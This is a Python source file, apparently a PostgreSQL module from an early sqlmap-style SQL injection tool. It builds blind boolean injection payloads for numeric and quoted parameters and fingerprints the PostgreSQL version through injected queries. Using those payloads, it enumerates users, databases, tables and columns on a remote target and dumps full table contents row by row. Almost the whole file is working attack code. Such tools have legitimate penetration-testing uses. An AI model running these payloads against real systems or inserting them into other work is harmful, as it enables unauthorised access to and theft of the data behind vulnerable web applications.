#!/usr/bin/env python


import random
import re
import time

from plugins.attack.db.dbDriver import dbDriver as Common


class PostgreSQLMap(Common):
    __banner                 = ""
    __currentDb              = ""
    __fingerprint            = []
    __cachedDbs              = []
    __cachedTables           = {}
    __cachedColumns          = {}


    def unescape(self, expression):
        while True:
            index = expression.find("'")
            if index == -1:
                break

            firstIndex = index + 1
            index = expression[firstIndex:].find("'")

            if index == -1:
                raise Exception, "Unenclosed ' in '%s'" % expression

            lastIndex = firstIndex + index
            old = "'%s'" % expression[firstIndex:lastIndex]
            unescaped = "("

            for i in range(firstIndex, lastIndex):
                unescaped += "CHR(%d)" % (ord(expression[i]))
                if i < lastIndex - 1:
                    unescaped += "||"

            unescaped += ")"
            expression = expression.replace(old, unescaped)

        return expression


    def createStm(self):
        if self.args.injectionMethod == "numeric":
            evilStm  = " OR ASCII(SUBSTR((%s), %d, %d)) > %d"
        elif self.args.injectionMethod == "stringsingle":
            evilStm  = "' OR ASCII(SUBSTR((%s), %d, %d)) > %d AND '1"
        elif self.args.injectionMethod == "stringdouble":
            evilStm  = '" OR ASCII(SUBSTR((%s), %d, %d)) > %d AND "1'

        return evilStm

    def createExactStm(self):
        if self.args.injectionMethod == "numeric":
            evilStm  = " OR SUBSTR((%s), %d, %d) = '%s' AND 1=1"
        elif self.args.injectionMethod == "stringsingle":
            evilStm  = "' OR SUBSTR((%s), %d, %d) = '%s' AND '1"
        elif self.args.injectionMethod == "stringdouble":
            evilStm  = '" OR SUBSTR((%s), %d, %d) = "%s" AND "1'

        return evilStm

    def getFingerprint(self):
        if not self.args.exaustiveFp:
            return "PostgreSQL"

        actVer = self.parseFp("PostgreSQL", self.__fingerprint)
        value = "active fingerprint: %s" % actVer

        if self.__banner:
            banVer = re.search("^PostgreSQL ([\d\.]+)", self.__banner)
            banVer = banVer.groups()[0]
            banVer = self.parseFp("PostgreSQL", [banVer])

            blank = " " * 16
            value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

        return value


    def getBanner(self):
        logMsg = "fetching banner"
        self.log(logMsg)

        if not self.__banner:
            self.__banner = self.getValue("VERSION()")

        return self.__banner


    def getCurrentUser(self):
        logMsg = "fetching current user"
        self.log(logMsg)

        return self.getValue("CURRENT_USER")


    def getCurrentDb(self):
        logMsg = "fetching current database"
        self.log(logMsg)

        if self.__currentDb:
            return self.__currentDb
        else:
            return self.getValue("CURRENT_DATABASE()")


    def getUsers(self):
        logMsg = "fetching number of database users"
        self.log(logMsg)

        stm  = "SELECT COUNT(DISTINCT(usename)) FROM pg_user"

        count = self.getValue(stm)

        if not len(count) or count == "0":
            errMsg = "unable to retrieve the number of database users"
            raise Exception, errMsg

        logMsg = "fetching database users"
        self.log(logMsg)

        users = []

        for index in range(int(count)):
            stm  = "SELECT DISTINCT(usename) "
            stm += "FROM pg_user OFFSET %d LIMIT 1" % index

            user = self.getValue(stm)
            users.append(user)

        if not users:
            raise Exception, "unable to retrieve the database users"

        return users


    def getDbs(self):
        logMsg = "fetching number of databases"
        self.log(logMsg)

        stm = "SELECT COUNT(DISTINCT(datname)) FROM pg_database"

        count = self.getValue(stm)

        if not len(count) or count == "0":
            errMsg = "unable to retrieve the number of databases"
            raise Exception, errMsg

        logMsg = "fetching database names"
        self.log(logMsg)

        dbs = []

        for index in range(int(count)):
            stm  = "SELECT DISTINCT(datname) "
            stm += "FROM pg_database OFFSET %d LIMIT 1" % index

            db = self.getValue(stm)
            dbs.append(db)

        if dbs:
            self.__cachedDbs = dbs
        else:
            errMsg = "unable to retrieve the database names"
            raise Exception, errMsg

        return dbs


    def getTables(self):
        if self.args.db and self.args.db != "public":
            self.args.db = "public"

            warnMsg  = "PostgreSQL module can only enumerate "
            warnMsg += "tables from current database, also "
            warnMsg += "known as '%s'" % self.args.db
            self.warn(warnMsg)
        else:
            self.args.db = "public"

        logMsg = "fetching number of tables for database '%s'" % self.args.db
        self.log(logMsg)

        stm  = "SELECT COUNT(DISTINCT(tablename)) FROM pg_tables "
        stm += "WHERE schemaname = '%s'" % self.args.db

        count = self.getValue(stm)

        if not len(count) or count == "0":
            errMsg  = "unable to retrieve the number of "
            errMsg += "tables for database '%s'" % self.args.db
            raise Exception, errMsg

        logMsg = "fetching tables for database '%s'" % self.args.db
        self.log(logMsg)

        dbTables = {}
        tables = []

        for index in range(int(count)):
            stm  = "SELECT DISTINCT(tablename) FROM pg_tables "
            stm += "WHERE schemaname = '%s' " % self.args.db
            stm += "OFFSET %d LIMIT 1" % index

            table = self.getValue(stm)
            tables.append(table)

        if tables:
            dbTables[self.args.db] = tables
        else:
            errMsg  = "unable to retrieve the tables "
            errMsg += "for database '%s'" % self.args.db
            raise Exception, errMsg

        self.__cachedTables = dbTables

        return dbTables


    def getColumns(self):
        if not self.args.tbl:
            errMsg = "missing table parameter"
            raise Exception, errMsg

        if "." in self.args.tbl:
            self.args.db, self.args.tbl = self.args.tbl.split(".")

        if self.args.db and self.args.db != "public":
            self.args.db = "public"

            warnMsg  = "PostgreSQL module can only enumerate "
            warnMsg += "columns from tables on current database, "
            warnMsg += "also known as '%s'" % self.args.db
            self.warn(warnMsg)
        else:
            self.args.db = "public"

        logMsg  = "fetching number of columns for table "
        logMsg += "'%s' on current database" % self.args.tbl
        self.log(logMsg)

        stm  = "SELECT COUNT(DISTINCT(attname)) "
        stm += "FROM pg_attribute JOIN pg_class ON "
        stm += "pg_class.oid = pg_attribute.attrelid "
        stm += "WHERE relname = '%s' " % self.args.tbl
        stm += "AND attnum > 0"

        count = self.getValue(stm)

        if not len(count) or count == "0":
            errMsg  = "unable to retrieve the number of columns "
            errMsg += "for table '%s' " % self.args.tbl
            errMsg += "on current database"
            raise Exception, errMsg

        logMsg  = "fetching columns for table '%s' " % self.args.tbl
        logMsg += "current database" 
        self.log(logMsg)

        tableColumns = {}
        table = {}
        columns = {}

        for index in range(int(count)):
            stm  = "SELECT DISTINCT(attname) "
            stm += "FROM pg_attribute JOIN pg_class ON "
            stm += "pg_class.oid = pg_attribute.attrelid "
            stm += "WHERE relname = '%s' " % self.args.tbl
            stm += "AND attnum > 0 OFFSET %d LIMIT 1" % index

            column = self.getValue(stm)

            stm  = "SELECT atttypid "
            stm += "FROM pg_attribute JOIN pg_class ON "
            stm += "pg_class.oid = pg_attribute.attrelid "
            stm += "WHERE relname = '%s' " % self.args.tbl
            stm += "AND attname = '%s'" % column

            coltype = self.getValue(stm)
            columns[column] = coltype

        if columns:
            table[self.args.tbl] = columns
            tableColumns[self.args.db] = table
        else:
            errMsg  = "unable to retrieve the columns for "
            errMsg += "table '%s' " % self.args.tbl
            errMsg += "on current database"
            raise Exception, errMsg

        self.__cachedColumns[self.args.db] = table

        return tableColumns


    def dumpTable(self):
        if not self.args.tbl:
            raise Exception, "missing table parameter"

        if self.args.db and self.args.db != "public":
            self.args.db = "public"

            warnMsg  = "PostgreSQL module can only dump "
            warnMsg += "tables on current database, "
            warnMsg += "also known as '%s'" % self.args.db
            self.warn(warnMsg)

        if not self.__cachedColumns:
            self.__cachedColumns = self.getColumns()

        logMsg  = "fetching number of entries for table "
        logMsg += "'%s' on current database" % self.args.tbl
        self.log(logMsg)

        fromExpr = "%s.%s" % (self.args.db, self.args.tbl)
        columnValues = {}
        stm = "SELECT COUNT(*) FROM %s" % fromExpr

        count = self.getValue(stm)

        if not len(count) or count == "0":
            errMsg  = "unable to retrieve the number of entries "
            errMsg += "for table '%s' " % self.args.tbl
            errMsg += "on current database"
            raise Exception, errMsg

        if self.args.col:
            self.args.col = self.args.col.split(',')

        columns = self.__cachedColumns[self.args.db][self.args.tbl]

        for column in columns.keys():
            if self.args.col and column not in self.args.col:
                continue

            logMsg  = "fetching entries of column '%s' for " % column
            logMsg += "table '%s' on current database" % self.args.tbl
            self.log(logMsg)

            length = 0
            values = []
            columnData = {}
            columnValues[column] = {}

            for index in range(int(count)):
                stm  = "SELECT %s FROM %s " % (column, fromExpr)
                stm += "OFFSET %d LIMIT 1" % index
                value = self.getValue(stm)

                length = max(length, len(str(value)))
                values.append(value)

            if length < len(column):
                columnData["length"] = len(column)
            else:
                columnData["length"] = length

            columnData["values"] = values
            columnValues[column] = columnData

        if columnValues:
            infos = {}

            if self.args.db:
                infos["db"] = self.args.db
            else:
                infos["db"] = None
            infos["table"] = self.args.tbl
            infos["count"] = count

            columnValues["__infos__"] = infos
        else:
            errMsg  = "unable to retrieve the entries for "
            errMsg += "table '%s'" % self.args.tbl
            if self.args.db:
                errMsg += " on database '%s'" % self.args.db
            raise Exception, errMsg

        return columnValues


    def getFile(self, filename):
        errMsg = "PostgreSQL module does not support file reading"
        raise Exception, errMsg


    def getExpr(self, expression):
        if self.args.unionUse:
            return self.unionUse(expression)
        else:
            return self.getValue(expression)


    def checkDbms(self):
        logMsg = "testing PostgreSQL"
        self.log(logMsg)

        randInt = str(random.randint(1, 9))
        stm = "COALESCE(%s, NULL)" % randInt

        if self.getValue(stm) == randInt:
            logMsg = "confirming PostgreSQL"
            self.log(logMsg)

            stm = "LENGTH('%s')" % randInt

            if not self.getValue(stm) == "1":
                warnMsg = "remote database is not PostgreSQL"
                self.warn(warnMsg)

                return False

            if not self.args.exaustiveFp:
                return True

            if self.getValue("SUBSTR(TRANSACTION_TIMESTAMP(), 1, 1)") == "2":
                self.__fingerprint = [">= 8.2.0"]
            elif self.getValue("GREATEST(5, 9, 1)") == "9":
                self.__fingerprint = [">= 8.1.0", "< 8.2.0"]
            elif self.getValue("WIDTH_BUCKET(5.35, 0.024, 10.06, 5)") == "3":
                self.__fingerprint = [">= 8.0.0", "< 8.1.0"]
            elif self.getValue("SUBSTR(MD5('sqlmap'), 1, 1)"):
                self.__fingerprint = [">= 7.4.0", "< 8.0.0"]
            elif self.getValue("SUBSTR(CURRENT_SCHEMA(), 1, 1)") == "p":
                self.__fingerprint = [">= 7.3.0", "< 7.4.0"]
            elif self.getValue("BIT_LENGTH(1)") == "8":
                self.__fingerprint = [">= 7.2.0", "< 7.3.0"]
            elif self.getValue("SUBSTR(QUOTE_LITERAL('a'), 2, 1)") == "a":
                self.__fingerprint = [">= 7.1.0", "< 7.2.0"]
            elif self.getValue("POW(2, 3)") == "8":
                self.__fingerprint = [">= 7.0.0", "< 7.1.0"]
            elif self.getValue("MAX('a')") == "a":
                self.__fingerprint = [">= 6.5.0", "< 6.5.3"]
            elif re.search("([\d\.]+)", self.getValue("SUBSTR(VERSION(), 12, 5)")):
                self.__fingerprint = [">= 6.4.0", "< 6.5.0"]
            elif self.getValue("SUBSTR(CURRENT_DATE, 1, 1)") == "2":
                self.__fingerprint = [">= 6.3.0", "< 6.4.0"]
            elif self.getValue("SUBSTRING('sqlmap', 1, 1)") == "s":
                self.__fingerprint = [">= 6.2.0", "< 6.3.0"]
            else:
                self.__fingerprint = ["< 6.2.0"]

            if self.args.getBanner:
                self.__banner = self.getValue("VERSION()")

            return True
        else:
            warnMsg = "remote database is not PostgreSQL"
            self.warn(warnMsg)

            return False

    def __init__(self, urlOpener, cmpFunction, vuln):
        Common.__init__( self, urlOpener, cmpFunction, vuln )

